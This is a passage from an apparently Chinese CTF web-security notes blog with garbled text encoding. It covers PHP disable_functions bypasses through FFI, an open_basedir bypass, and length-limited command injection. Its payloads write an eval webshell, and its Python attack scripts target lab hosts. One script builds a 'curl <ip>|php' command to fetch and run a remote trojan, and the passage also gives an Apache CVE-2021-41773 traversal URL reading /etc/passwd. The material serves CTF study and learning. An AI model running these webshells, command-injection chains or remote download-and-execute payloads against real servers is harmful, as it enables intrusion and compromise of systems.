å…¥çš„<code>cmd</code>ï¼Œä¸Šä¼ phpè‡³å¯å†™ç›®å½•ï¼ŒincludeåŒ…å«æ‰§è¡Œã€‚</p><p>æ³•2ï¼šæ— éœ€ä¸Šä¼ ï¼Œå°†ä»£ç æ”¾å…¥<code>eval</code>å‡½æ•°æ‰§è¡Œã€‚</p><ul><li><p>å‚è€ƒé¢˜</p><p>buuoj-GKCTF2020-CheckIn</p></li></ul></li><li><p><strong>FFI</strong></p><p>ä½¿ç”¨æ¡ä»¶ï¼šPHPç‰ˆæœ¬&gt;=7.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>); </span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;cd /;./readflag &gt; /var/www/html/good.txt&quot;</span>); </span><br><span class="line">readgzfile(<span class="string">&quot;good.txt&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç›´æ¥è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°ï¼Œphp_execçš„typeä¸º3æ—¶å¯¹åº”çš„æ˜¯passthruï¼Œç›´æ¥å°†ç»“æœåŸå§‹è¾“å‡º</span></span><br><span class="line"><span class="variable">$e</span>=FFI::cdef(<span class="string">&quot;int php_exec(int type, char *cmd);&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>-&gt;php_exec(<span class="number">3</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨cé‡Œçš„popenï¼Œç„¶åä»ç®¡é“ä¸­è¯»å–ç»“æœ</span></span><br><span class="line"><span class="variable">$e</span>=FFI::cdef(<span class="string">&quot;void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="variable">$e</span>-&gt;popen(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$c</span>=<span class="variable">$e</span>-&gt;fgetc(<span class="variable">$o</span>))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span>.=str_pad(strval(dechex(<span class="variable">$c</span>)),<span class="number">2</span>,<span class="string">&quot;0&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span>-&gt;pclose(<span class="variable">$o</span>);</span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>å‚è€ƒ</p><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745">PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</a></p></li></ul><p>â€‹</p><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=mkdir(<span class="string">&#x27;/tmp/test&#x27;</span>);chdir(<span class="string">&#x27;/tmp/test&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="keyword">echo</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h3><ul><li><p><strong>7å­—ç¬¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å†™å…¥è¯­å¥</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">#base64ç¼–ç å</span></span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"><span class="comment">#éœ€è¦è¢«æ‰§è¡Œçš„è¯­å¥ï¼š</span></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">hp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">1.p\\</span></span><br><span class="line"><span class="bash">&gt;d\&gt;\\</span></span><br><span class="line"><span class="bash">&gt;\ -\\</span></span><br><span class="line"><span class="bash">&gt;e64\\</span></span><br><span class="line"><span class="bash">&gt;bas\\</span></span><br><span class="line"><span class="bash">&gt;7\|\\</span></span><br><span class="line"><span class="bash">&gt;XSk\\</span></span><br><span class="line"><span class="bash">&gt;Fsx\\</span></span><br><span class="line"><span class="bash">&gt;dFV\\</span></span><br><span class="line"><span class="bash">&gt;kX0\\</span></span><br><span class="line"><span class="bash">&gt;bCg\\</span></span><br><span class="line"><span class="bash">&gt;XZh\\</span></span><br><span class="line"><span class="bash">&gt;AgZ\\</span></span><br><span class="line"><span class="bash">&gt;waH\\</span></span><br><span class="line"><span class="bash">&gt;PD9\\</span></span><br><span class="line"><span class="bash">&gt;o\ \\</span></span><br><span class="line"><span class="bash">&gt;ech\\</span></span><br><span class="line"><span class="bash">ls -t&gt;0</span></span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">		requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>5å­—ç¬¦</strong></p><ul><li><p>æ€è·¯1</p><p>æ‹¼æ¥å­—ç¬¦ä¸²å†™å…¥ä¸€å¥è¯ï¼ŒåŒ7å­—ç¬¦ã€‚</p></li><li><p>æ€è·¯2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">dir</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">f\&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ht-</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sl</span></span><br><span class="line">*&gt;v</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">rev</span></span><br><span class="line">*v&gt;0</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">a</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">hp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">p\\</span></span><br><span class="line"><span class="bash">&gt;1.\\</span></span><br><span class="line"><span class="bash">&gt;\&gt;\\</span></span><br><span class="line"><span class="bash">&gt;-d\\</span></span><br><span class="line"><span class="bash">&gt;\ \\</span></span><br><span class="line"><span class="bash">&gt;64\\</span></span><br><span class="line"><span class="bash">&gt;se\\</span></span><br><span class="line"><span class="bash">&gt;ba\\</span></span><br><span class="line"><span class="bash">&gt;\|\\</span></span><br><span class="line"><span class="bash">&gt;7\\</span></span><br><span class="line"><span class="bash">&gt;Sk\\</span></span><br><span class="line"><span class="bash">&gt;X\\</span></span><br><span class="line"><span class="bash">&gt;x\\</span></span><br><span class="line"><span class="bash">&gt;Fs\\</span></span><br><span class="line"><span class="bash">&gt;FV\\</span></span><br><span class="line"><span class="bash">&gt;d\\</span></span><br><span class="line"><span class="bash">&gt;X0\\</span></span><br><span class="line"><span class="bash">&gt;k\\</span></span><br><span class="line"><span class="bash">&gt;g\\</span></span><br><span class="line"><span class="bash">&gt;bC\\</span></span><br><span class="line"><span class="bash">&gt;h\\</span></span><br><span class="line"><span class="bash">&gt;XZ\\</span></span><br><span class="line"><span class="bash">&gt;gZ\\</span></span><br><span class="line"><span class="bash">&gt;A\\</span></span><br><span class="line"><span class="bash">&gt;aH\\</span></span><br><span class="line"><span class="bash">&gt;w\\</span></span><br><span class="line"><span class="bash">&gt;D9\\</span></span><br><span class="line"><span class="bash">&gt;P\\</span></span><br><span class="line"><span class="bash">&gt;S&#125;\\</span></span><br><span class="line"><span class="bash">&gt;IF\\</span></span><br><span class="line"><span class="bash">&gt;&#123;\\</span></span><br><span class="line"><span class="bash">&gt;\$\\</span></span><br><span class="line"><span class="bash">&gt;o\\</span></span><br><span class="line"><span class="bash">&gt;ch\\</span></span><br><span class="line"><span class="bash">&gt;e\\</span></span><br><span class="line"><span class="bash">sh 0</span></span><br><span class="line">sh f            </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>4å­—ç¬¦</strong></p><ul><li><p>æ€è·¯1</p><p>ä¼ å…¥<code>&gt;cat</code>ï¼Œåœ¨ç›®æ ‡ç›®å½•ä¸‹å†™å…¥catæ–‡ä»¶ï¼›</p><p>å†ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œæ‰§è¡Œ<code>&gt;* /*</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ã€‚</p></li><li><p>æ€è·¯2</p><p>å­—ç¬¦æ‹¼æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">dir</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">f\&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ht-</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sl</span></span><br><span class="line">*&gt;v        (ç­‰åŒäºå‘½ä»¤ï¼šdir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">rev</span></span><br><span class="line">*v&gt;0        (ç­‰åŒäºå‘½ä»¤ï¼šrev v &gt; 0)(0é‡Œé¢çš„å†…å®¹ä½:ls -th &gt;f)</span><br><span class="line">sh 0        (shæ‰§è¡Œ0é‡Œé¢çš„å†…å®¹)</span><br></pre></td></tr></table></figure></li><li><p>æ€è·¯3</p><p>åå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">&#x27;http://52.197.41.31/&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># å­˜æ”¾å¾…ä¸‹è½½æ–‡ä»¶çš„å…¬ç½‘ä¸»æœºçš„IP</span></span><br><span class="line">shell_ip = <span class="string">&#x27;xx.xx.xx.xx&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># æœ¬æœºIP</span></span><br><span class="line">your_ip = r.get(<span class="string">&#x27;http://ipv4.icanhazip.com/&#x27;</span>).text.strip()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å°†shell_IPè½¬æ¢æˆåå…­è¿›åˆ¶</span></span><br><span class="line">ip = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line">reset = target + <span class="string">&#x27;?reset&#x27;</span></span><br><span class="line">cmd = target + <span class="string">&#x27;?cmd=&#x27;</span></span><br><span class="line">sandbox = target + <span class="string">&#x27;sandbox/&#x27;</span> + </span><br><span class="line">    hashlib.md5(<span class="string">&#x27;orange&#x27;</span> + your_ip).hexdigest() + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payloadæŸäº›ä½ç½®çš„å¯é€‰å­—ç¬¦</span></span><br><span class="line">pos0 = random.choice(<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">&#x27;hkpq&#x27;</span>)</span><br><span class="line">pos2 = <span class="string">&#x27;g&#x27;</span>  <span class="comment"># éšæ„é€‰æ‹©å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º dir çš„æ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%s&gt;&#x27;</span> % pos0,</span><br><span class="line">    <span class="comment"># å‡è®¾pos0é€‰æ‹© f , åˆ›å»ºåä¸º f&gt; çš„æ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%st-&#x27;</span> % pos1,</span><br><span class="line">    <span class="comment"># å‡è®¾pos1é€‰æ‹© k , åˆ›å»ºåä¸º kt- çš„æ–‡ä»¶,å¿…é¡»åŠ ä¸ªpos1ï¼Œ</span></span><br><span class="line">    <span class="comment"># å› ä¸ºalphabeticalåºä¸­t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º &gt;sl çš„æ–‡ä»¶ï¼›åˆ°æ­¤å¤„æœ‰å››ä¸ªæ–‡ä»¶ï¼Œ</span></span><br><span class="line">    <span class="comment"># ls çš„ç»“æœä¼šæ˜¯ï¼šdir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="comment"># å‰æ–‡æåˆ°ï¼Œ * ç›¸å½“äº `ls` ï¼Œé‚£ä¹ˆè¿™æ¡å‘½ä»¤ç­‰ä»·äº `dir f&gt; kt- sl`&gt;v ï¼Œ</span></span><br><span class="line">    <span class="comment">#  å‰é¢æåˆ°diræ˜¯ä¸æ¢è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ—¶ä¼šåˆ›å»ºæ–‡ä»¶ v å¹¶å†™å…¥ f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># éå¸¸å¥‡å¦™ï¼Œè¿™é‡Œçš„æ–‡ä»¶åæ˜¯ v ï¼Œåªèƒ½æ˜¯v ï¼Œæ²¡æœ‰å¯é€‰å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º rev çš„æ–‡ä»¶ï¼Œè¿™æ—¶å½“å‰ç›®å½•ä¸‹ ls çš„ç»“æœæ˜¯ï¼š dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*v&gt;%s&#x27;</span> % pos2,</span><br><span class="line">    <span class="comment"># é­”æ³•å‘ç”Ÿåœ¨è¿™é‡Œï¼š *v ç›¸å½“äº rev v ï¼Œ* çœ‹ä½œé€šé…ç¬¦ã€‚å‰æ–‡ä¹Ÿæè¿‡äº†ï¼Œä½“ä¼šä¸€ä¸‹ã€‚</span></span><br><span class="line">    <span class="comment"># è¿™æ—¶pos2æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ g æ–‡ä»¶å†…å®¹æ˜¯æ–‡ä»¶vå†…å®¹çš„åè½¬ï¼š ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ç»­è¡Œåˆ†å‰² curl 0x11223344|php å¹¶é€†åºå†™å…¥</span></span><br><span class="line">    <span class="string">&#x27;&gt;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ph\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;|\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[8:10],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[6:8],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[4:6],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[2:4],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[0:2],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt; \<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#x27;</span>sh <span class="string">&#x27; + pos2,</span></span><br><span class="line"><span class="string">    # sh g ;g çš„å†…å®¹æ˜¯ ls -tk &gt; f ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠé€†åºçš„å‘½ä»¤åè½¬å›æ¥ï¼Œ</span></span><br><span class="line"><span class="string">    # è™½ç„¶ f çš„æ–‡ä»¶å¤´éƒ¨ä¼šæœ‰æ‚è´¨ï¼Œä½†ä¸å½±å“æœ‰æ•ˆå‘½ä»¤çš„æ‰§è¡Œ</span></span><br><span class="line"><span class="string">    &#x27;</span>sh <span class="string">&#x27; + pos0,</span></span><br><span class="line"><span class="string">    # sh f æ‰§è¡Œcurlå‘½ä»¤ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå†™å…¥æœ¨é©¬ã€‚</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">s = r.get(reset)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4</span></span><br><span class="line"><span class="string">    s = r.get(cmd + i)</span></span><br><span class="line"><span class="string">    print &#x27;</span>[%d]<span class="string">&#x27; % s.status_code, s.url</span></span><br><span class="line"><span class="string">    sleep(0.1)</span></span><br><span class="line"><span class="string">s = r.get(sandbox + &#x27;</span>fun.php?cmd=uname -a<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">print &#x27;</span>[%d]<span class="string">&#x27; % s.status_code, s.url</span></span><br><span class="line"><span class="string">print s.text</span></span><br></pre></td></tr></table></figure><p>â€‹</p></li></ul></li></ul><h3 id="ä¸­é—´ä»¶æ¼æ´"><a href="#ä¸­é—´ä»¶æ¼æ´" class="headerlink" title="ä¸­é—´ä»¶æ¼æ´"></a>ä¸­é—´ä»¶æ¼æ´</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ol><li><p>Apache 2.4.49</p><p>CVE-2021-41773</p><p>ç›®å½•ç©¿è¶Šæ¼æ´ã€‚å¯ä»¥è¯»å–åˆ°ApacheæœåŠ¡å™¨Webç›®å½•ä»¥å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œæˆ–è€…è¯»å–Webä¸­çš„è„šæœ¬æºç ï¼Œæˆ–è€…åœ¨å¼€å¯cgiæˆ–cgidçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p><code>http://xxx/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p></li></ol></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/" title="é›¶å®½åº¦å­—ç¬¦éšå†™"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;ä¸Šä¸€ç¯‡</span></a></li><li class="next"><a href="/2020/05/18/crypto-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/" title="ä»¿å°„å¯†ç "><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ³¢~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p 